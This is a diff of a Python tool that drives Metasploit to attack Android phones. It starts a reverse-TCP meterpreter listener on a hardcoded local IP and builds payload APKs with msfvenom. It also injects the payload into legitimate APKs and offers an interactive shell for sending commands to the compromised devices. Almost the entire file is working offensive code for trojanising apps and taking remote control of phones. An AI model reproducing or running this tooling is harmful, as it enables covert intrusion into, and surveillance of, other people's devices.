@@ -1,6 +1,47 @@
 import os
 from pymetasploit3.msfrpc import MsfRpcClient
+import threading
+from pynput import keyboard
 
+client = MsfRpcClient('12345678', port=6565)
+exploit = client.modules.use('exploit', 'multi/handler')
+payload = client.modules.use('payload', 'android/meterpreter/reverse_tcp')
+payload['LHOST'] = "192.168.57.13"
+payload['LPORT'] = "6565"
+exploit.execute(payload=payload)
+print("Our tool started listening")
+# execute above details
+def restart_session():
+    def on_press(key):
+        if key == keyboard.Key.shift:
+            print("Shift pressed - restarting session...")
+            interact_with_session()
+
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
+def interact_with_session():
+    try:
+
+        session_id = input("Enter the session ID: ")
+        session = client.sessions.session(session_id)
+        print(f"Interacting with session {session_id}")
+    except Exception as e:
+        main()
+    # Start listener thread for shift key
+    threading.Thread(target=restart_session, args=(), daemon=True).start()
+
+    while True:
+
+        try:
+
+            command = input("meterpreter> ")
+            if command.lower() == "exit":
+                break
+            else:
+                output = session.run_with_output(command)
+                print(output)
+        except Exception as e:
+            print("")
 def main():
     # first i make the asciart with https://www.asciiart.eu/text-to-ascii-art
     ascii_art = """
@@ -16,20 +57,19 @@ def main():
     #then print it
     print(ascii_art)
     #two primary veriable will setting in (choose number 1)
-    lhost = None
-    lport = None
+    lhost = "192.168.57.13"
+    lport = "6565"
     #our sesions with metasploit set when Start Metasploit listener (choose number 2)
-    client = None
+
 
     while True:
         print("\nPlease choose an option:")
         print("1. Set your host and port")
-        print("2. Start Metasploit listener")
-        print("3. Generate APK payload")
-        print("4. Inject APK payload")
-        print("5. List active sessions")
-        print("6. Interact with a session")
-        print("7. Exit")
+        print("2. Generate APK payload")
+        print("3. Inject APK payload")
+        print("4. List active sessions")
+        print("5. Interact with a session")
+        print("6. Exit")
         choice = input("\nEnter your choice: ")
 
         if choice == '1':
@@ -39,27 +79,11 @@ def main():
             print("your port :",lport)
 
         elif choice == '2':
-            #here we will connect to metasploit RPC (Remote Procedure Call)
-            #we should run the server by write the comand in terminal
-            #msfconsole -x "load msgrpc ServerHost=127.0.0.1 ServerPort=4444 User=msf Pass=12345678"
-            client = MsfRpcClient('12345678', port=4444)
-            #bellow we will use multi/handler it is metasploit model to handle incoming conections
-            exploit = client.modules.use('exploit', 'multi/handler')
-            #then we use reverse_tcp to wait other side conection back
-            payload = client.modules.use('payload', 'android/meterpreter/reverse_tcp')
-            # set host and port
-            payload['LHOST'] = lhost
-            payload['LPORT'] = lport
-            # execute above details
-            exploit.execute(payload=payload)
-            print("Our tool started listening")
-
-        elif choice == '3':
                 #we use msfvenom tool to generate apk
                 fname = input("enter name of file with .apk")
                 os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} R > {fname}")
 
-        elif choice == '4':
+        elif choice == '3':
             original_apk = input("Enter original APK path and name (with .apk): ")
             output_apk = input("Enter output APK path and name (with .apk): ")
             if lhost and lport:
@@ -68,7 +92,7 @@ def main():
             else:
                 print("Please set LHOST and LPORT first (option 1).")
 
-        elif choice == '5':
+        elif choice == '4':
             sessions = client.sessions.list
             if not sessions:
                 print("there are not active sessions found")
@@ -77,22 +101,13 @@ def main():
                 for session_id, details in sessions.items():
                     print(f"id- {session_id}, device-: {details['info']}")
 
-        elif choice == '6':
-                session_id = input("enter the session id : ")
-                session = client.sessions.session(session_id)
-                print(f"Interacting with session {session_id}")
-                #to manege session and pass coamand to the devide
-                while True:
-                    command = input("meterpreter> ")
-                    if command == "exit":
-                        break
-                    else:
-                        output = session.run_with_output(command)
-                        print(output)
+        elif choice == '5':
 
-        elif choice == '7':
+            interact_with_session()
+        elif choice == '6':
+
             print("Good bye")
-            break
+           # break
 
         else:
             print("please choise correct one")
